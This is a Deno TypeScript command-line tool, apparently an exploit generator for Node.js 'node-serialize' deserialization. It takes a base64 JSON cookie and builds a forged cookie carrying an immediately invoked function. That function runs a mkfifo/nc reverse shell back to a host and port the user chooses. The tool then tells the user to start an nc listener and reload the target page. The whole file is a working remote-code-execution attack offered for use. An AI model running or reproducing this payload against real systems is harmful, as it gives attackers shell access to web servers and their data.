function help() {
  console.log(`
  Deno - A simple command line tool for Deno
    => Node - Serialize install backdoor

  Usage: Deno run main.ts [args]

  Arguments:
    -h, --help:   Show this help
    -host         Host dest for the backdoor
    -port         Port dest for the backdoor (defalt: 4444)
    -b64          Base64 encode cookie

  Examples:
    deno run main.ts -host 8.8.8.8 -port 1234 -b64 eyJ1c2VyTmFtZSI6ImF6ZSIsInBhc3NXb3JkIjoiYXplIn0=
  `)
}


function getAllKey(obj:Object) {
  let keys = []
  for (let key in obj) {
    keys.push(key)
  }
  return keys.splice(1, keys.length)
}



function main() {
  try {
    let port = "4444"
    let host = Deno.args[Deno.args.indexOf('-host') + 1]
    if (Deno.args.indexOf('-port') != -1) {
      port = Deno.args[Deno.args.indexOf('-port') + 1]
    }
    let b64 = Deno.args[Deno.args.indexOf('-b64') + 1].replace(/%3D/g, '=')
    let initialCookie = atob(b64), initialCookieJSON, addContent="";
    try {
      initialCookieJSON = JSON.parse(initialCookie)
    } catch (err) {
      console.log('[error] - not a JSON in the Base64 cookie')
    }
    let allOther = getAllKey(initialCookieJSON)
    for (let i = 0; i < allOther.length; i++) {
      addContent = addContent + `,"${allOther[i]}" : "InjectByAlice"`
    }
    let finalCookie = btoa(JSON.parse(JSON.stringify(`{"${Object.keys(initialCookieJSON)[0]}": "_$$ND_FUNC$$_function(){ require('child_process').execSync(\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f\\", function puts(error, stdout, stderr) {});}()" ${addContent}}`)))
    
    console.log('\n[INFO] - On your hacking Server: nc -nvlp '+port)
    
    console.log('[INFO] - You need to replace your cookie with: \n')
    console.log(finalCookie)
    console.log('\n[INFO] - And reload the webpage\n[INFO] - Then look your server ^^')

  } catch (e) {
    console.log(e)
  }
}


function checkArgs() {
  if (Deno.args.length < 1) {
    console.log('No command specified')
    return false
  } else if (Deno.args.indexOf('--help') != -1 || Deno.args.indexOf('-h') != -1) {
    help()
  } else {
    main()
  }
}

checkArgs()